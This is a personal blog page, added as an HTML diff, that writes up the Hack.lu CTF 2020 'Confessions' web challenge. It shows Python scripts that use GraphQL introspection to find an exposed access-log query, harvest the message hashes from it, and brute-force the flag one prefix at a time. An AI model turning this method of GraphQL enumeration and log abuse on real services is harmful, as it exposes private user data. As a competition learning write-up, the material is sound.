@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html>
+<title>Antoni Chrobot</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Bootstrap -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
+
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto'>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/styles/atelier-forest-dark.min.css" integrity="sha512-bHrTOKTYdBppORvOCgGWhwUt68kqsl5e9cemM/7hf1uehwPUjtAiGyXzcoBFRN3SnktP0582tbAzkPPMWVTgVQ==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<link rel="stylesheet" href="../style.css">
+<style>
+html,body,h1,h2,h3,h4,h5,h6 {font-family: "Roboto", sans-serif}
+</style>
+
+<body>
+
+<!-- Page Container -->
+<div class="container-fluid px-5">
+
+<!-- navbar  -->
+<nav class="navbar navbar-expand-lg topnav mt-1 mb-3 p-0">
+    	
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+    <span class="navbar-toggler-icon">
+    <i class="fa fa-navicon" style="color: white"></i>
+    </span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="collapsibleNavbar">
+    	
+    <ul class="navbar-nav">
+	<li class="nav-item">
+	    <a class="navlink" href="../index.html">Home</a>
+	</li>
+	<li class="nav-item">
+	    <a class="navlink" href="../projects.html">Projects</a>
+	</li>
+	<li class="nav-item">
+	    <a class="active navlink" href="../ctf.html">CTF</a>
+	</li>
+    </ul>
+
+    </div>
+</nav>
+<!-- end navbar  -->
+	
+
+<div class="row justify-content-center"> 
+
+    <div class="col-12 col-xl-9">
+
+    <div class="w3-display-container w3-container gray-bg w3-card  w3-margin-bottom">
+
+	<!-- CONTENT GOES HERE -->
+
+	<h2 class="title mb-2">Hack.lu CTF 2020: Confessions</h2>
+	<div class="meta mb-3">
+	<span class="date">October 10, 2020</span>
+	</div>
+	<hr>
+
+
+<h1>Challenge</h1>
+
+<p>Prompt:</p>
+
+<a href="../images/hacklu-writeups/confessions-prompt.png"/>
+<img src="../images/hacklu-writeups/confessions-prompt.png" class="blog-img" alt="png" />
+</a>
+
+<p>We are presented with a web page that let&rsquo;s us post confessions. Basically we can enter a title and a message, and the sha256 hash of the message is reflected on the page:</p>
+
+<a href="../images/hacklu-writeups/confessions-main-page.png"/>
+<img src="../images/hacklu-writeups/confessions-main-page.png" class="blog-img" alt="png" />
+</a>
+
+<p>Quick look at the source code reveals <i>confessions.js</i>. Let&rsquo;s have a look.</p>
+
+<pre><code>
+// talk to the GraphQL endpoint
+const gql = async (query, variables={}) => {
+    let response = await fetch(&lsquo;/graphql&rsquo;, {
+        method: &lsquo;POST&rsquo;,
+        headers: {
+            &lsquo;content-type&rsquo;: &lsquo;application/json&rsquo;,
+        },
+        body: JSON.stringify({
+            operationName: null,
+            query,
+            variables,
+        }),
+    });
+    let json = await response.json();
+    if (json.errors &amp;&amp; json.errors.length) {
+        throw json.errors;
+    } else {
+        return json.data;
+    }
+};
+
+// some queries/mutations
+const getConfession = async hash => gql(&lsquo;query Q($hash: String) { confession(hash: $hash) { title, hash } }&rsquo;, { hash }).then(d => d.confession);
+const getConfessionWithMessage = async id => gql(&lsquo;mutation Q($id: String) { confessionWithMessage(id: $id) { title, hash, message } }&rsquo;, { id }).then(d => d.confessionWithMessage);
+const addConfession = async (title, message) => gql(&lsquo;mutation M($title: String, $message: String) { addConfession(title: $title, message: $message) { id } }&rsquo;, { title, message }).then(d => d.addConfession);
+const previewHash = async (title, message) => gql(&lsquo;mutation M($title: String, $message: String) { addConfession(title: $title, message: $message) { hash } }&rsquo;, { title, message }).then(d => d.addConfession);
+
+// the important elements
+const title = document.querySelector(&lsquo;#title&rsquo;);
+const message = document.querySelector(&lsquo;#message&rsquo;);
+const publish = document.querySelector(&lsquo;#publish&rsquo;);
+const preview = document.querySelector(&lsquo;#preview&rsquo;);
+
+// render a confession
+const show = async confession => {
+    if (confession) {
+        preview.querySelector(&lsquo;.title&rsquo;).textContent = confession.title || &lsquo;&lt;title&gt;rsquo;;
+        preview.querySelector(&lsquo;.hash&rsquo;).textContent = confession.hash || &lsquo;&lt;hash&gt;&rsquo;;
+        preview.querySelector(&lsquo;.message&rsquo;).textContent = confession.message || &lsquo;&lt;message&gt;&rsquo;;
+        preview.querySelector(&lsquo;.how-to-verify&rsquo;).textContent = sha256(${JSON.stringify(confession.message || '')});
+    } else {
+        preview.innerHTML = &lsquo;&lt;em&gt;Not found :(&lt;/em&gt;&rsquo;;
+    }
+};
+
+// update the confession preview
+const update = async () => {
+    let { hash } = await previewHash(title.value, message.value);
+    let confession = await getConfession(hash);
+    await show({
+        &hellip;confession,
+        message: message.value,
+    });
+};
+title.oninput = update;
+message.oninput = update;
+
+// publish a confession
+publish.onclick = async () => {
+    title.disabled = true;
+    message.disabled = true;
+    publish.disabled = true;
+
+let { id } = await addConfession(title.value, message.value);
+location.href = `#${id}`;
+location.reload(); 
+};
+
+// show a confession when one is given in the location hash
+if (location.hash) {
+    let id = location.hash.slice(1);
+    document.querySelector(&lsquo;#input&rsquo;).remove();
+    getConfessionWithMessage(id).then(show).catch(() => document.write(&lsquo;F&rsquo;));
+}
+</code></pre>
+
+
+<h2>GraphQL Schema introspection</h2>
+
+<p>The above code reveals that GraphQL is used for storing and accessing confessions.
+There is a query, <code>confession</code>, as well as two mutations, <code>confessionWithMessage</code> and <code>addConfession</code>.</p>
+
+<p>I wanted to further enumerate the GraphQL schema and see if there is anything else accessible to us. I did not have much experience with GraphQL prior to this challenge so this was a great learning opportunity.</p>
+<p>I found this guide, <a href="https://moonhighway.com/five-introspection-queries">https://moonhighway.com/five-introspection-queries</a> and used some of the queries to see what I can learn about the GraphQL schema for this challenge.</p>
+
+<p>First, let&rsquo;s see if there are any other queries we can send:
+<a href="../images/hacklu-writeups/query-types.png"/>
+<img src="../images/hacklu-writeups/query-types.png" class="blog-img" alt="png" />
+</a>
+</p>
+
+<p>The query <code>accessLog</code> sticks out like a sore thumb.
+Let&rsquo;s try to send an accessLog query:</p>
+
+<p>
+<a href="../images/hacklu-writeups/access-log-query-response.png"/>
+<img src="../images/hacklu-writeups/access-log-query-response.png" class="blog-img" alt="png" />
+</a>
+</p>
+
+<p>Looks like we&rsquo;re onto something here. We can see in the response a bunch of confessions and their hashes. The timestamps are not consistent with the time at which I was playing with the web app and sending my own trial &lsquo;confessions&rsquo;.</p>
+
+<p>I stripped out all of the hashes, and sent a <code>confession</code> query with each of the hashes passed as arguments. This is the response I received:</p>
+
+<p>
+<a href="../images/hacklu-writeups/confession-w-title.png"/>
+<img src="../images/hacklu-writeups/confession-w-title.png" class="blog-img" alt="png" />
+</a>
+</p>
+
+<p>Below is the script used to send <code>accessLog</code> query, strip out hashes, and send each one as an argument to a <code>confession</code> query.</p>
+
+<pre><code class="language-python">import requests
+import json
+
+session = requests.Session()
+
+url = &lsquo;https://confessions.flu.xxx/graphql&rsquo;
+
+query = &ldquo;&rdquo;&ldquo;
+query Q{
+    accessLog{
+        name, timestamp, args
+    }
+}
+&rdquo;&ldquo;&rdquo;
+
+full_query = {
+    &lsquo;operationName&rsquo;: None,
+    &lsquo;query&rsquo;: query,
+    &lsquo;variables&rsquo;:{
+        &lsquo;hash&rsquo;:&lsquo;827ade3254c72ae811201b418766d9a8802e91b029d95cc9de2f0169274aedd7&rsquo;
+    }
+}
+r = session.post(url, json=full_query)
+
+response_json = json.loads(r.text)
+
+print(&lsquo;Query: &rsquo;)
+print(query)
+print(&lsquo;************************************************&rsquo;)
+
+print(&lsquo;response: &rsquo;)
+print(json.dumps(response_json, indent=2))
+print(&lsquo;************************************************&rsquo;)
+print(&lsquo;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&rsquo;)
+print()
+
+hashes = []
+for i in response_json[&lsquo;data&rsquo;][&lsquo;accessLog&rsquo;]:
+    if &lsquo;hash&rsquo; in i[&lsquo;args&rsquo;]:
+        hashes.append(i[&lsquo;args&rsquo;].split(&lsquo;&ldquo;:&rdquo;&rsquo;)[1].split(&lsquo;&ldquo;}&rsquo;)[0])
+
+for h in hashes: print(h)
+
+# send each hash
+
+query = &ldquo;&rdquo;&ldquo;
+query Q($hash: String){
+    confession(hash: $hash){
+        title, hash, id, message
+    }
+}
+&rdquo;&ldquo;&rdquo;
+
+for h in hashes:
+    full_query = {
+        &lsquo;operationName&rsquo;: None,
+        &lsquo;query&rsquo;: query,
+        &lsquo;variables&rsquo;:{
+            &lsquo;hash&rsquo;:h
+        }
+    }
+
+r = session.post(url, json=full_query)
+
+response_json = json.loads(r.text)
+
+print('hash: ')
+print(h)
+print('************************************************')
+
+print('response: ')
+print(json.dumps(response_json, indent=2))
+print('************************************************')
+print('------------------------------------------------')
+print()
+</code></pre>
+
+
+<p>Each of these confessions had a title of <b>Flag</b>. But why are there so many?</p>
+
+<p>I entered the first couple of hashes into <a href="https://crackstation.net/">CrackStation</a>.</p>
+<p>The first hash was found to be <code>f</code></p>
+<p>Next one was <code>fl</code></p>
+<p>And the subsequent hashes started spelling out <code>flag{</code></p>
+
+<h2>Cracking the hashes by iteratively bruteforcing</h2>
+
+<p>I could not crack any more hashes on CrackStation, but now I could see a clear path to the flag:</p>
+
+<ul>
+<li>iterate through all ascii characters</li>
+<li>add this character to the already known flag, and calculate sha256 sum</li>
+<li>see if calculated hash is in the list of exposed hashes from accessLog query</li>
+<li>if it is, add that character to the running flag</li>
+<li>iterate until flag is complete</li>
+</ul>
+
+
+<p>Below is my script that does this:</p>
+
+<pre><code class="language-python">import hashlib
+import string
+
+with open(&lsquo;hashes.txt&rsquo;) as f:
+    h = f.read()
+
+# get list of hashes from hashes.txt
+
+hashes = h.split(&lsquo;\n&rsquo;)
+
+flag = []
+
+while len(flag) &lt; 28:
+    for c in string.printable:
+        temp = &lsquo;&rsquo;.join(flag) + c
+        hashed = hashlib.sha256(temp.encode()).hexdigest()
+        if hashed in hashes:
+            flag.append(c);
+            print(&lsquo;&rsquo;.join(flag))
+</pre></code>
+
+<h2>Flag</h2>
+
+<a href="../images/hacklu-writeups/flag.png"/>
+<img src="../images/hacklu-writeups/flag.png" class="blog-img" alt="png" />
+</a>
+
+
+	<!-- END CONTENT -->
+
+
+    </div> <!-- End display container -->
+    </div> <!-- End columns -->
+</div> <!-- End row -->
+
+<footer class="fixed-bottom w3-deep-purple w3-center pt-2">
+    <a class="mx-2" href="mailto:antoni.chrobot@gmail.com"><i class="fa fa-envelope w3-hover-opacity"></i></a>
+
+    <a class="mx-2" href="https://www.linkedin.com/in/antonichrobot/" ><i class="fa fa-linkedin w3-hover-opacity"></i></a>
+
+    <a class="mx-2" href="https://github.com/achrobot1" ><i class="fa fa-github "></i></a>
+
+    <a class="mx-2" href="https://twitter.com/AntoniChrobot" ><i class="fa fa-twitter w3-hover-opacity"></i></a>
+
+  <p>Find me on social media.</p>
+  
+  
+  <p><a href="#" >Top</a></p>
+</footer>
+
+</body>
+</html>
+
+
